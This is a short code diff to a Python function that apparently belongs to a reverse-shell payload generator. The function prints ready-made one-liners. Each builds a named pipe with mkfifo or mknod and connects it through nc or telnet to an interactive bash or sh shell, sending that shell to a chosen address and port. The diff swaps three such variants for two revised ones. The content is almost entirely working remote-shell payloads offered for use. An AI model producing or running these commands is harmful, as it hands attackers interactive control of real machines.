@@ -26,9 +26,8 @@ def bash_shell(address, port):
 
 
 def file_shell(address, port):
-    print('\n' + BLUE_C + f'rm -f /tmp/f 2>/dev/null; mknod /tmp/f p && nc {address} {port} < /tmp/f | bash -i &> /tmp/f', end='\n\n')
-    print(BLUE_C + f'rm -f /tmp/f 2>/dev/null; mkfifo /tmp/f && nc {address} {port} < /tmp/f | bash -i &> /tmp/f', end='\n\n')
-    print(BLUE_C + f'rm -f /tmp/f 2>/dev/null; mkfifo /tmp/f && telnet {address} {port} < /tmp/f | bash -i &> /tmp/f', end='\n\n')
+    print('\n' + BLUE_C + f'rm -f /tmp/f; mknod /tmp/f p; nc {address} {port} < /tmp/f | sh -i >/tmp/f 2>/tmp/f', end='\n\n')
+    print(BLUE_C + f'rm -f /tmp/f; mkfifo /tmp/f; nc {address} {port} < /tmp/f | sh -i >/tmp/f 2>/tmp/f', end='\n\n')
 
 
 def python_shell(address, port, version=''):
